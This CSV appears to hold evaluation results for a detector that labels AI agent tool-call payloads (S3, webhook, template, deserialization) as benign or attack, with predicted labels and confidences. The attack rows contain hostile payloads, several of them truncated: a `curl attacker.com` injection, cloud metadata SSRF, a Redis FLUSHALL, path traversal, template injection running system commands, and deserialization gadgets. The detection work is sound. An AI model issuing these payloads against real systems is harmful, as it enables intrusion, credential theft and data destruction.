tool_name,payload,true_label,pred_label,confidence,dist_benign,dist_attack
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.secret""}",attack,attack,1.0,0.027233481407165527,0.008120298385620117
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/18/""}",benign,attack,0.5594559736806185,0.035231709480285645,0.032168030738830566
s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""key"": ""reports/report10.csv""}",benign,attack,0.5649655352334818,0.024554848670959473,0.02712148427963257
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/""}",benign,attack,0.6230561932763246,0.03614848852157593,0.029931724071502686
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/2/""}",benign,attack,0.5952999395223763,0.03391784429550171,0.029311060905456543
s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user24/file.txt""}",benign,benign,1.0,0.008392274379730225,0.021529734134674072
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/14/""}",benign,attack,0.5589256257368953,0.03384053707122803,0.03092294931411743
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/8/""}",benign,attack,0.5473568849808803,0.031816720962524414,0.029593348503112793
s3_operation,"{""operation"": ""list"", ""bucket"": ""logs"", ""prefix"": ""2024/01/""}",benign,attack,0.5157230169534301,0.02435755729675293,0.024950265884399414
s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user12/file.txt""}",benign,benign,1.0,0.007184147834777832,0.021857917308807373
s3_operation,"{""operation"": ""put"", ""bucket"": ""backups"", ""key"": ""2024/backup.sql""}",benign,benign,0.8809424392343288,0.013815760612487793,0.02461165189743042
s3_operation,"{""operation"": ""delete"", ""bucket"": ""temp"", ""key"": ""cache/old.json""}",benign,benign,0.8161832069997983,0.016948342323303223,0.026297330856323242
s3_operation,"{""operation"": ""get"", ""bucket"": ""documents"", ""key"": ""reports/annual.pdf""}",benign,attack,0.6206966025072341,0.0449826717376709,0.037382423877716064
s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user123/photo.jpg""}",benign,benign,0.8277245673766931,0.01975429058074951,0.03140437602996826
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""key"": ""cache/old.json"", ""prefix"": ""im",benign,attack,0.5162599891442409,0.02704387903213501,0.026379764080047607
s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""prefix"": ""images/"", ""key"": ""user16/fi",benign,attack,0.6988332292797557,0.014602720737457275,0.019838154315948486
s3_operation,"{""operation"": ""get"", ""bucket"": ""my-app-data"", ""key"": ""uploads/file.pdf""}",benign,attack,0.6035898218821248,0.020058870315551758,0.023509323596954346
s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user0/file.txt""}",benign,benign,1.0,0.00865703821182251,0.021077275276184082
s3_operation,"{""operation"": ""head"", ""bucket"": ""assets"", ""key"": ""logo.png""}",benign,attack,0.5114552750763705,0.0337449312210083,0.03434121608734131
s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""key"": ""uploads/file.pdf"", ""prefix"": """,benign,attack,0.524587462906356,0.03426390886306763,0.032999515533447266
s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-8"", ""key"": ""files/doc28.pdf""}",benign,benign,0.9860978587979538,0.009745776653289795,0.02200448513031006
s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-0"", ""key"": ""files/doc20.pdf""}",benign,benign,0.877969323659081,0.011763930320739746,0.020821750164031982
s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""prefix"": ""images/"", ""key"": ""reports/rep",benign,attack,0.5851386330251523,0.02924567461013794,0.02567112445831299
s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-6"", ""key"": ""files/doc6.pdf""}",benign,benign,1.0,0.008625686168670654,0.02161937952041626
s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""key"": ""reports/report22.csv""}",benign,attack,0.5342689020924077,0.024979114532470703,0.02632319927215576
s3_operation,"{""operation"": ""get"", ""bucket"": ""hr-data"", ""key"": ""employee-ssn.csv""}",attack,attack,0.5181403224856369,0.030434250831604004,0.029601633548736572
s3_operation,"{""operation"": ""get"", ""bucket"": ""company-secrets"", ""key"": ""credentials.json""}",attack,attack,0.5371509446060994,0.03247493505477905,0.030681133270263672
s3_operation,"{""operation"": ""list"", ""bucket"": ""audit-logs"", ""prefix"": """"}",attack,attack,0.6218188197338819,0.03700214624404907,0.030697107315063477
s3_operation,"{""operation"": ""list"", ""bucket"": ""`curl attacker.com`"", ""prefix"": """"}",attack,attack,0.6403294606796118,0.05092477798461914,0.04105657339096069
s3_operation,"{""operation"": ""get"", ""bucket"": ""http://169.254.169.254/latest/meta-data"", ""key"":",attack,attack,0.8315795826148915,0.052080750465393066,0.03249478340148926
s3_operation,"{""operation"": ""put"", ""bucket"": ""public-bucket"", ""key"": ""shell.php"", ""content"": """,attack,attack,0.661508325411555,0.027743995189666748,0.021645545959472656
s3_operation,"{""operation"": ""copy"", ""source"": ""s3://victim-bucket/secrets"", ""dest"": ""s3://atta",attack,attack,0.6659660223508006,0.0547831654548645,0.042446255683898926
s3_operation,"{""operation"": ""get"", ""bucket"": ""../../../../etc"", ""key"": ""passwd""}",attack,attack,0.9930018675266828,0.08859467506408691,0.0386049747467041
send_webhook,"{""url"": ""https://api.pagerduty.com/webhooks"", ""payload"": {""event"": ""trigger""}}",benign,benign,0.8631364337757554,0.011098861694335938,0.019025743007659912
send_webhook,"{""url"": ""https://hooks.example.com/webhook/2"", ""payload"": {""event"": ""event_2""}}",benign,benign,0.8903314545639138,0.008906781673431396,0.016194462776184082
send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 10""}}",benign,benign,0.8801795992439649,0.007758617401123047,0.01379847526550293
send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 0""}}",benign,benign,0.8385835571207982,0.007917344570159912,0.012879014015197754
send_webhook,"{""url"": ""https://webhook.site/32"", ""payload"": {""data"": 32}}",benign,benign,0.933821273102446,0.0078391432762146,0.015695512294769287
send_webhook,"{""url"": ""https://hooks.example.com/webhook/6"", ""payload"": {""event"": ""event_6""}}",benign,benign,0.9330812311360412,0.008410036563873291,0.01681053638458252
send_webhook,"{""url"": ""https://webhook.site/14"", ""payload"": {""data"": 14}}",benign,benign,0.9287053932496783,0.009089648723602295,0.017991304397583008
send_webhook,"{""url"": ""https://discord.com/api/webhooks/xxx/yyy"", ""payload"": {""content"": ""Mess",benign,attack,0.5252984329847317,0.017778456211090088,0.018338501453399658
send_webhook,"{""url"": ""https://webhook.site/8"", ""payload"": {""data"": 8}}",benign,benign,0.9378564440343414,0.007905364036560059,0.01597273349761963
send_webhook,"{""url"": ""https://api.zapier.com/hooks/catch/xxx"", ""payload"": {""data"": ""test""}}",benign,attack,0.5970737545214004,0.010936439037322998,0.012320220470428467
send_webhook,"{""url"": ""https://api.github.com/repos/owner/repo/dispatches"", ""payload"": {""event",benign,attack,0.6017009469160135,0.01590782403945923,0.01802295446395874
send_webhook,"{""url"": ""https://webhook.site/22"", ""payload"": {""data"": 22}}",benign,benign,0.9534234138582166,0.00849682092666626,0.01778566837310791
send_webhook,"{""url"": ""https://hooks.example.com/webhook/18"", ""payload"": {""event"": ""event_18""}",benign,benign,0.9599867640196915,0.008539795875549316,0.018146514892578125
send_webhook,"{""url"": ""https://hooks.example.com/webhook/12"", ""payload"": {""event"": ""event_12""}",benign,benign,0.9078567132221087,0.008444249629974365,0.01595604419708252
send_webhook,"{""url"": ""https://webhook.site/16"", ""payload"": {""data"": 16}}",benign,benign,0.920100987406461,0.00876307487487793,0.017014503479003906
send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 20""}}",benign,benign,0.8845515579961915,0.00788801908493042,0.014162540435791016
send_webhook,"{""url"": ""https://webhook.site/30"", ""payload"": {""data"": 30}}",benign,benign,0.9158009371121023,0.008697152137756348,0.01672571897506714
send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 26""}}",benign,benign,0.9006145718130134,0.007278025150299072,0.013534605503082275
send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 4""}}",benign,benign,0.8958659216516638,0.0073430538177490234,0.013513922691345215
send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 34""}}",benign,benign,0.9064522376449835,0.007300615310668945,0.013752341270446777
send_webhook,"{""url"": ""https://webhook.site/unique-id"", ""payload"": {""test"": true}}",benign,benign,0.7425535647035313,0.012073397636413574,0.016087889671325684
send_webhook,"{""url"": ""https://webhook.site/24"", ""payload"": {""data"": 24}}",benign,benign,0.9101948442952565,0.009349644184112549,0.017758429050445557
send_webhook,"{""url"": ""https://hooks.slack.com/services/xxx/yyy/zzz"", ""payload"": {""text"": ""Ale",benign,attack,0.5572127075082234,0.024079442024230957,0.022447824478149414
send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 28""}}",benign,benign,0.9118814182027224,0.007034718990325928,0.013411521911621094
send_webhook,"{""url"": ""https://internal.corp.net/webhook"", ""payload"": {""token"": ""xxx""}}",attack,attack,0.5094468651736552,0.011999547481536865,0.012139320373535156
send_webhook,"{""url"": ""http://localhost:6379/"", ""payload"": ""*1\r\n$8\r\nFLUSHALL\r\n""}",attack,attack,1.0,0.055831730365753174,0.046882808208465576
send_webhook,"{""url"": ""gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil.com>"", ""payload"": {}}",attack,attack,0.8259987754757815,0.0357399582862854,0.022563457489013672
send_webhook,"{""url"": ""http://127.0.0.1:9200/_search"", ""payload"": {""query"": {""match_all"": {}}}",attack,attack,0.8899219557397093,0.028744161128997803,0.0158231258392334
send_webhook,"{""url"": ""http://169.254.169.254/latest/meta-data/iam/security-credentials/"", ""pa",attack,attack,0.7786550588091472,0.03601574897766113,0.025097548961639404
send_webhook,"{""url"": ""http://2852039166/latest/meta-data/"", ""payload"": {}}",attack,attack,0.7365937583060458,0.02493607997894287,0.018942534923553467
send_webhook,"{""url"": ""file:///etc/passwd"", ""payload"": {}}",attack,attack,1.0,0.04769796133041382,0.041460633277893066
send_webhook,"{""url"": ""https://admin-api.company.com/notify"", ""payload"": {""secret"": ""yyy""}}",attack,attack,0.5124747051145379,0.01654273271560669,0.016797661781311035
render_template,"{""template"": ""Hello, {{name}}!"", ""data"": {""name"": ""John""}}",benign,benign,0.9431451427763211,0.010350704193115234,0.02116525173187256
render_template,"{""template"": ""Hello, {{name}}! Your ID is 16"", ""data"": {""name"": ""User16""}}",benign,benign,1.0,0.008243799209594727,0.021147847175598145
render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 14""}}",benign,attack,0.5464727409372317,0.02736419439315796,0.02871263027191162
render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 22""}}",benign,attack,0.5314614685261504,0.027337968349456787,0.028242766857147217
render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 30""}}",benign,attack,0.531627141408192,0.02817404270172119,0.029111504554748535
render_template,"{""template"": ""User: {{user.name}} ({{user.email}})"", ""data"": {""user"": {""name"": """,benign,benign,0.8597454327462632,0.0259019136428833,0.04407918453216553
render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 18}}",benign,attack,0.6008000747759119,0.017260193824768066,0.01915973424911499
render_template,"{""template"": ""Hello, {{name}}! Your ID is 34"", ""data"": {""name"": ""User34""}}",benign,benign,0.962557025182169,0.011466264724731445,0.024509549140930176
render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 10}}",benign,attack,0.5998750166041836,0.01624429225921631,0.018014729022979736
render_template,"{""template"": ""Hello, {{name}}! Your ID is 6"", ""data"": {""name"": ""User6""}}",benign,benign,1.0,0.008630752563476562,0.02071237564086914
render_template,"{""template"": ""Hello, {{name}}! Your ID is 20"", ""data"": {""name"": ""User20""}}",benign,benign,1.0,0.009721159934997559,0.023753643035888672
render_template,"{""template"": ""Hello, {{name}}! Your ID is 4"", ""data"": {""name"": ""User4""}}",benign,benign,0.9945492578590813,0.008827388286590576,0.02033233642578125
render_template,"{""template"": ""Order #{{order_id}} - Total: ${{total}}"", ""data"": {""order_id"": 123",benign,attack,0.5118879286025524,0.025954008102416992,0.026275277137756348
render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 12""}}",benign,attack,0.534672529086595,0.028157532215118408,0.02918630838394165
render_template,"{""template"": ""Hello, {{name}}! Your ID is 24"", ""data"": {""name"": ""User24""}}",benign,benign,1.0,0.009788215160369873,0.02379518747329712
render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 32""}}",benign,attack,0.5304136110261624,0.025821924209594727,0.026647627353668213
render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 2}}",benign,attack,0.53494944505009,0.01767897605895996,0.018330156803131104
render_template,"{""template"": ""Items: {% for item in items %}{{item}}, {% endfor %}"", ""data"": {""i",benign,attack,0.5194087702412321,0.03545612096786499,0.034751057624816895
render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 8}}",benign,attack,0.6097606722243067,0.016995608806610107,0.01904231309890747
render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 0}}",benign,attack,0.5754133621881665,0.01641261577606201,0.017745494842529297
render_template,"{""template"": ""<h1>{{title}}</h1><p>{{content}}</p>"", ""data"": {""title"": ""Welcome""",benign,benign,0.7217088559352377,0.033743441104888916,0.043095409870147705
render_template,"{""template"": ""Date: {% now 'Y-m-d' %}"", ""data"": {}}",benign,attack,0.7344998840170679,0.04074108600616455,0.031081020832061768
render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 26""}}",benign,attack,0.5460158881295369,0.026612520217895508,0.027910709381103516
render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 28}}",benign,attack,0.6170403314165906,0.01643657684326172,0.01855570077896118
render_template,"{""template"": ""{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",attack,attack,0.7874945514188381,0.056854188442230225,0.038900673389434814
render_template,"{""template"": ""API Key: {{api_key}}"", ""data"": {""api_key"": ""sk-xxx""}}",attack,attack,0.6297763888811706,0.018109500408172607,0.02071666717529297
render_template,"{""template"": ""Password: {{password}}"", ""data"": {""password"": ""secret""}}",attack,benign,0.7174193998493459,0.02146965265274048,0.027182340621948242
render_template,"{""template"": ""{{self._TemplateReference__context.cycler.__init__.__globals__.os.",attack,attack,1.0,0.08247828483581543,0.06160426139831543
render_template,"{""template"": ""{{constructor.constructor('return this.process')().mainModule.requ",attack,attack,0.778537606879559,0.056118130683898926,0.03911536931991577
render_template,"{""template"": ""${{<%[%'\""}}%\\."", ""data"": {}}",attack,attack,0.9327271626144573,0.045954108238220215,0.023008406162261963
render_template,"{""template"": ""<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')",attack,attack,0.8413423599208228,0.05738335847854614,0.03507035970687866
render_template,"{""template"": ""${T(java.lang.Runtime).getRuntime().exec('id')}"", ""data"": {}}",attack,attack,0.7709601402279465,0.057619333267211914,0.0407944917678833
deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 24, \""name\"": \""item24\""}""}",benign,benign,1.0,0.011549890041351318,0.0431634783744812
deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 18, \""name\"": \""item18\""}""}",benign,benign,1.0,0.013734102249145508,0.045473456382751465
deserialize_data,"{""format"": ""msgpack"", ""data"": ""base64_encoded_msgpack""}",benign,attack,0.5103149030333961,0.04949319362640381,0.05104881525039673
deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 10, \""name\"": \""item10\""}""}",benign,benign,1.0,0.01359635591506958,0.04443925619125366
deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 16}]}""}",benign,benign,1.0,0.00853276252746582,0.04202139377593994
deserialize_data,"{""format"": ""xml"", ""data"": ""<data><item>test</item></data>""}",benign,attack,0.5238312403268006,0.08342897891998291,0.08961474895477295
deserialize_data,"{""format"": ""json"", ""data"": ""{\""name\"": \""test\""}""}",benign,benign,1.0,0.008299291133880615,0.0428047776222229
deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 22, \""name\"": \""item22\""}""}",benign,benign,1.0,0.010958552360534668,0.042804837226867676
deserialize_data,"{""format"": ""toml"", ""data"": ""[database]\nhost = \""localhost\""""}",benign,attack,0.6371269008888794,0.018936634063720703,0.028744101524353027
deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 6}]}""}",benign,benign,1.0,0.007828235626220703,0.04035001993179321
deserialize_data,"{""format"": ""yaml"", ""data"": ""name: test\nvalue: 123""}",benign,attack,0.6666873473149242,0.020351290702819824,0.03392106294631958
deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 26}]}""}",benign,benign,1.0,0.008569121360778809,0.03991788625717163
deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 2\\nname: item2""}",benign,benign,1.0,0.013553440570831299,0.03635692596435547
deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 28}]}""}",benign,benign,1.0,0.008539915084838867,0.04056042432785034
deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 30\\nname: item30""}",benign,benign,1.0,0.016066014766693115,0.037926435470581055
deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 1}]}""}",benign,benign,1.0,0.007938623428344727,0.042177557945251465
deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 12\\nname: item12""}",benign,benign,0.9790624848602945,0.016940712928771973,0.037624239921569824
deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 20, \""name\"": \""item20\""}""}",benign,benign,1.0,0.011901319026947021,0.04520481824874878
deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 14, \""name\"": \""item14\""}""}",benign,benign,1.0,0.012842833995819092,0.04367917776107788
deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 32\\nname: item32""}",benign,benign,1.0,0.015298604965209961,0.04101204872131348
deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 4\\nname: item4""}",benign,benign,1.0,0.01531141996383667,0.03808814287185669
deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 8\\nname: item8""}",benign,benign,0.9878308199893937,0.01641237735748291,0.03720802068710327
deserialize_data,"{""format"": ""yaml"", ""data"": ""settings:\n  debug: false\n  port: 3000""}",benign,attack,0.5841378827641002,0.0270535945892334,0.034868597984313965
deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 0}]}""}",benign,benign,1.0,0.008244872093200684,0.04164481163024902
deserialize_data,"{""format"": ""json"", ""data"": ""{\""credentials\"": {\""key\"": \""secret\""}}""}",attack,benign,1.0,0.01972717046737671,0.04617202281951904
deserialize_data,"{""format"": ""php"", ""data"": ""O:8:\""stdClass\"":1:{s:4:\""evil\"";s:20:\""system('id');",attack,attack,0.5628037110121465,0.03356438875198364,0.0405460000038147
deserialize_data,"{""format"": ""yaml"", ""data"": ""!!python/object/new:subprocess.check_output [['cat',",attack,attack,0.5862310465768378,0.05576878786087036,0.042994141578674316
deserialize_data,"{""format"": ""yaml"", ""data"": ""api_key: sk-xxx""}",attack,attack,0.5197259176990854,0.03446841239929199,0.03657037019729614
deserialize_data,"{""format"": ""java"", ""data"": ""rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==""}",attack,attack,1.0,0.12575697898864746,0.04439324140548706
deserialize_data,"{""format"": ""yaml"", ""data"": ""!!python/object/apply:os.system ['id']""}",attack,attack,0.5016168618089375,0.04436290264129639,0.044578611850738525
deserialize_data,"{""format"": ""pickle"", ""data"": ""gASVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlF",attack,attack,1.0,0.20974701642990112,0.08404064178466797
deserialize_data,"{""format"": ""ruby"", ""data"": ""!ruby/object:Gem::Requirement requirements: !ruby/ob",attack,attack,0.5647701518491616,0.07373279333114624,0.060674428939819336
